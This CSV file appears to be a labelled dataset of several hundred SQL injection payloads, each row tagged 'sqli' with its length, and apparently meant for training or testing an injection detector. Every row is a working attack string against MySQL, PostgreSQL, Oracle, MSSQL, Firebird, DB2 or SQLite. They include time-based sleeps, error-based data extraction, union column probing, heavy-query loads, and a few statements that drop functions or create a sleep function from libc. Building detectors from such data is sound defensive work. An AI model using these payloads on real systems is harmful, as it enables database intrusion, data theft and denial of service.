payload,length,attack_type
1)) as xcsm where 9231=9231;select sleep(5)#,44,sqli
"1"") as kuuf where 6908=6908;if(7899=7899) select 7899 else drop function zbbp--",79,sqli
1') or (select * from (select(sleep(5)))ydpu),45,sqli
1');begin user_lock.sleep(5); end,33,sqli
"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",151,sqli
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",94,sqli
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",84,sqli
"1"" and 7533=7533 and ""dqjp""=""dqjp",33,sqli
-5585' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),237,sqli
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",97,sqli
"1%"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",245,sqli
"1)) as jrzr where 5194=5194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli
"1) where 7485=7485 and make_set(8403=8403,8899)--",49,sqli
1) as sglv where 7676=7676;begin dbms_lock.sleep(5); end--,58,sqli
"1%"" and 2388=benchmark(5000000,md5(0x6d457153))#",48,sqli
"1) where 5615=5615 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",222,sqli
"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",98,sqli
1)));select pg_sleep(5) and (((9476=9476,40,sqli
"1');select * from generate_series(7494,7494,case when (7494=7854) then 1 else 0 end) limit 1--",94,sqli
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf",126,sqli
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""sckh""=""sckh",113,sqli
"-4015"" where 2610=2610 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",153,sqli
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",73,sqli
"-9507%"" union all select 3342,3342,3342,3342,3342#",50,sqli
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('swua' like 'swua",119,sqli
"1' in boolean mode) or elt(6272=6272,sleep(5))#",47,sqli
"1%"") or elt(6272=6272,sleep(5)) and (""%""=""",42,sqli
"1%'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",97,sqli
-3422%') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',112,sqli
"1%'))) union all select null,null,null,null,null,null,null,null#",64,sqli
1'||(select 'tvcy' where 5592=5592 order by 1#,46,sqli
"1) and 2388=benchmark(5000000,md5(0x6d457153))#",47,sqli
"1'||(select 'cfff' where 4994=4994;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",120,sqli
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,117,sqli
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",201,sqli
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('dcys' like 'dcys",141,sqli
"1'+(select 'uzaw' where 9900=9900 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",136,sqli
"-8588' union all select 2135,2135--",35,sqli
1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,67,sqli
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",112,sqli
"1) and 8407=(select count(*) from generate_series(1,5000000))",61,sqli
"1%"" and elt(5345=8751,8751) and ""%""=""",37,sqli
"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli
"1'||(select 'dbxr' where 4014=4014 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",133,sqli
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",222,sqli
"1)) as rpwt where 4103=4103 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli
"1,(select (case when (5726=5275) then 1 else 1/(select 0) end))",63,sqli
"1"" and 7533=7533 and ""btak"" like ""btak",38,sqli
"1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'",82,sqli
1') and (1414=4775)*4775 and ('mlmw'='mlmw,42,sqli
1'));waitfor delay '0:0:5' and (('uvlf'='uvlf,45,sqli
"1"") union all select null#",26,sqli
-5615') where 5931=5931 or 8450=9229,36,sqli
1' and 4374=2305,16,sqli
"1') where 5871=5871;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli
"1') where 9226=9226 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",118,sqli
1')) and 7533=7533 and (('gvoh'='gvoh,37,sqli
1') rlike sleep(5),18,sqli
"-4964"")) union all select 4750,4750,4750,4750,4750--",52,sqli
1')) as yqcl where 5026=5026 rlike (select * from (select(sleep(5)))sgvo)--,75,sqli
"1"") as pwvu where 8267=8267;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",111,sqli
"1) union all select null,null,null,null,null,null,null,null,null#",65,sqli
"-2382%') union all select 8885,8885,8885,8885,8885,8885,8885#",61,sqli
"1%""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""%""=""",83,sqli
1')) and 9198=9198--,20,sqli
"-2857%'))) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",68,sqli
"1%"") union all select null,null,null,null,null,null,null#",57,sqli
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('pwpc'='pwpc",136,sqli
"1 and make_set(9681=4703,4703)# zbrf",36,sqli
"1"" where 9332=9332 union all select null,null,null,null,null,null,null,null,null--",82,sqli
"-5013'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('ehwh' like 'ehwh",229,sqli
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",164,sqli
"1' where 6409=6409;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli
"1') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",98,sqli
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""=""",99,sqli
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('boud'='boud",89,sqli
"1)) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((8294=8294",220,sqli
1)));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,88,sqli
-9202' where 9799=9799 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,226,sqli
"1') or elt(6272=6272,sleep(5)) and ('xwsb'='xwsb",48,sqli
"1) as estm where 4809=4809 union all select null,null,null--",60,sqli
"1' in boolean mode) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",171,sqli
"-2048)) union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",71,sqli
-8409)) as ipbz where 9984=9984 or 3371=3869,44,sqli
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",48,sqli
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",215,sqli
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",104,sqli
"1"") as ymsc where 3694=3694 waitfor delay '0:0:5'--",51,sqli
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,96,sqli
"1)) as xebl where 3105=3105 or 8421=(select count(*) from generate_series(1,5000000))--",87,sqli
"-2783' where 1494=1494 union all select 1494,1494,1494,1494,1494,1494--",71,sqli
1 rlike (select (case when (8314=5463) then 1 else 0x28 end)),61,sqli
"1' in boolean mode) and make_set(8403=8403,8899)#",49,sqli
"1%'))) union all select null,null,null,null,null,null,null,null,null,null#",74,sqli
-2120') or 8734=8844#,21,sqli
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)-- fzhj",195,sqli
"1"" rlike sleep(5) and ""rylv"" like ""rylv",39,sqli
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",115,sqli
"1'||(select 'djoe' from dual where 8063=8063 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'",246,sqli
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",116,sqli
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",49,sqli
"-2549') as zfnf where 1993=1993 union all select 1993,1993,1993,1993,1993,1993--",80,sqli
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""ejmj"" like ""ejmj",83,sqli
"1' in boolean mode) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,sqli
"1' in boolean mode);select * from generate_series(1431,1431,case when (1431=7822) then 1 else 0 end) limit 1--",110,sqli
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,59,sqli
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",102,sqli
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""bkoq""=""bkoq",79,sqli
"-4825%') union all select 6804,6804,6804,6804,6804,6804,6804--",62,sqli
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",62,sqli
"-5998"") as gazd where 2814=2814 union all select 2814,2814,2814,2814,2814,2814,2814--",85,sqli
1 where 7464=7464 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,79,sqli
"1' union all select null,null,null--",36,sqli
"1""))) and make_set(6751=8128,8128) and (((""uhiy""=""uhiy",54,sqli
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",112,sqli
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468",122,sqli
"1')) as mdtm where 1393=1393 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli
"1"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",70,sqli
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""mjkl""=""mjkl",117,sqli
"1) as udjn where 6871=6871 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",121,sqli
"-5702'))) union all select 7806,7806,7806,7806,7806--",53,sqli
"-4546') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",202,sqli
"1 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",108,sqli
"1%"")) union all select null,null,null,null,null,null,null,null,null#",68,sqli
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",75,sqli
1') where 5145=5145;if(2823=3532) select 2823 else drop function kmqw--,71,sqli
1'||(select 'hkvl' from dual where 8882=8882;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,109,sqli
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",81,sqli
"1%"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",155,sqli
"1""))) and 7533=7533 and (((""xopd""=""xopd",39,sqli
"1"";begin dbms_lock.sleep(5); end and ""xlvn""=""xlvn",49,sqli
"-3637"" or (8459=8459)*4906",26,sqli
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,71,sqli
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('dssx' like 'dssx",121,sqli
1')) rlike (select (case when (6205=1384) then 1 else 0x28 end)) and (('ahjf'='ahjf,83,sqli
1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,101,sqli
"-6656"") union all select 3931#",30,sqli
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('fdoc' like 'fdoc",230,sqli
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""eslj"" like ""eslj",122,sqli
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli
1' where 8945=8945 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,114,sqli
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rspz'='rspz",217,sqli
"1"") rlike (select * from (select(sleep(5)))vwyq)#",49,sqli
-1816%'))) union all select 2072--,34,sqli
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",113,sqli
"-9947""))) union all select 8765,8765,8765,8765,8765#",52,sqli
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),183,sqli
"-8209) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli
"1"") where 6018=6018 and 7533=7533--",35,sqli
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",118,sqli
"1"")) as qhnb where 8302=8302 and (3020=3020)*6703--",51,sqli
1 and 6802=3592--,17,sqli
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,sqli
1) as azoo where 8933=8933 and (3020=3020)*6703--,49,sqli
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ponv""=""ponv",222,sqli
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",62,sqli
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",64,sqli
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,206,sqli
"1"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli
1) or sleep(5) and (2211=2211,29,sqli
1) where 5418=5418 union all select null--,42,sqli
"1%"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,sqli
-7054) as gzvf where 9146=9146 or 3038=3038,43,sqli
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""wvkp"" like ""wvkp",117,sqli
-7111' or (8459=8459)*4906,26,sqli
1') and (1471=7892)*7892 and ('kkok' like 'kkok,47,sqli
"1'+(select 'zkuf' where 3591=3591 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",176,sqli
"1"")) as rign where 1604=1604 and 3661=3054--",44,sqli
"-9740"")) as pxkx where 5305=5305 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",163,sqli
"-3116""))) union all select 4600,4600,4600,4600--",48,sqli
"-3501""))) or (6789=6990)*6990 and (((""jnnc"" like ""jnnc",54,sqli
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""cbck"" like ""cbck",211,sqli
1') union all select null--,27,sqli
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",43,sqli
"1%"") union all select null,null,null#",37,sqli
1'||(select 'kuxp' where 7123=7123 and 1688=4200#,49,sqli
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",153,sqli
"1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",128,sqli
"1"";select sleep(5)#",19,sqli
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",112,sqli
"-9508) union all select 9950,9950,9950,9950,9950,9950,9950#",59,sqli
1')) and 3814=4272--,20,sqli
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",109,sqli
1))) rlike sleep(5) and (((6790=6790,36,sqli
"-6848"")) or 4071=5312",21,sqli
"1%"") and (3020=3020)*6703 and (""%""=""",36,sqli
"1"")) as xbhp where 7527=7527;select count(*) from generate_series(1,5000000)--",78,sqli
"-1763"") or elt(1032=1032,3623) and (""nqvv""=""nqvv",48,sqli
"1"" where 1132=1132 or 6793=(select 6793 from pg_sleep(5))--",59,sqli
"1"")) and elt(1210=1210,sleep(5)) and ((""afby""=""afby",51,sqli
"-5073"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""kbab"" like ""kbab",216,sqli
"1"";(select * from (select(sleep(5)))acdk)#",42,sqli
-2431') or 8571=8571--,22,sqli
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",85,sqli
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",92,sqli
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""agaz""=""agaz",176,sqli
"1 and elt(2770=3669,3669)# sfls",31,sqli
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli
1');begin dbms_lock.sleep(5); end and ('uxzv'='uxzv,51,sqli
"1%"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""%""=""",215,sqli
1');select sleep(5) and ('vwmx'='vwmx,37,sqli
"1') where 7640=7640 and make_set(8978=8594,8594)--",50,sqli
1%')));begin user_lock.sleep(5); end and ((('%'=',49,sqli
"1%""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",109,sqli
"-5518) as yvqm where 7360=7360 union all select 7360,7360#",58,sqli
-3752,5,sqli
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""ksrh""=""ksrh",174,sqli
"1 and elt(1210=1210,sleep(5))-- ommf",36,sqli
"1"") as rdvm where 6360=6360 and sleep(5)--",42,sqli
-7497') as kjzt where 3758=3758 or 4794=9499--,46,sqli
"1) union all select null,null,null,null,null,null,null,null,null,null--",71,sqli
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('vbda' like 'vbda",120,sqli
1)));begin dbms_lock.sleep(5); end--,36,sqli
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('rqyz'='rqyz",129,sqli
"1'))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",81,sqli
1' where 1045=1045 or 6793=(select 6793 from pg_sleep(5))--,59,sqli
1')));select sleep(5) and ((('klma'='klma,41,sqli
"-5160') as kgjw where 9609=9609 union all select 9609,9609--",60,sqli
"1"")) and elt(1210=1210,sleep(5)) and ((""utlk"" like ""utlk",56,sqli
"1')) and elt(4249=4249,7259) and (('oucg'='oucg",47,sqli
"1' and 8635=(select count(*) from generate_series(1,5000000))--",63,sqli
"1"") where 3727=3727 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",217,sqli
"1';select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",93,sqli
"1"" where 9083=9083 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",176,sqli
"-3872%""))) union all select 1637,1637,1637,1637,1637#",53,sqli
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",96,sqli
"1"")) as hwlh where 1071=1071 union all select null,null,null,null,null,null,null,null#",86,sqli
"1') where 8274=8274;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",107,sqli
"1%""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",101,sqli
1) union all select null#,25,sqli
"1%"") and 9198=9198--",20,sqli
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('gxpr'='gxpr",83,sqli
"1"") rlike (select (case when (8732=6244) then 1 else 0x28 end)) and (""unuk""=""unuk",81,sqli
"1'+(select tafk where 9652=9652;select benchmark(5000000,md5(0x714e4153))#",74,sqli
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'akki'='akki",189,sqli
"1') where 8167=8167;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,sqli
"1%'))) union all select null,null#",34,sqli
-5547' or 9323=9323#,20,sqli
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""xqgt"" like ""xqgt",124,sqli
"-3082"") where 1082=1082 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",220,sqli
"1"") where 8390=8390;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",117,sqli
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",55,sqli
"1' where 2391=2391 union all select null,null,null,null,null,null,null,null,null,null--",87,sqli
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'cipk'='cipk",109,sqli
"-4028) where 3244=3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",81,sqli
"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((5432=5432",107,sqli
"-4558' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli
"-3834'))) union all select 8313,8313--",38,sqli
"1%'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",114,sqli
"-5062""))) or (1069=8974)*8974 and (((""hsge""=""hsge",49,sqli
"1,(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",125,sqli
1 rlike (select * from (select(sleep(5)))sgvo),46,sqli
"1') where 8348=8348 and elt(4249=4249,7259)--",45,sqli
1')) and 4650=1322#,19,sqli
"-3249'))) union all select 6309,6309#",37,sqli
"1%'))) union all select null,null,null,null,null,null#",54,sqli
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""=""hjxh",102,sqli
"1')) as hrra where 9533=9533 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli
"1"" and elt(2373=5817,5817) and ""rsdt""=""rsdt",43,sqli
"1"")) as vtad where 3653=3653 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",119,sqli
"1%'))) or 8156=(select count(*) from generate_series(1,5000000))--",66,sqli
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# cykf,194,sqli
"1));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((8535=8535",102,sqli
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",102,sqli
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)-- bqxe",116,sqli
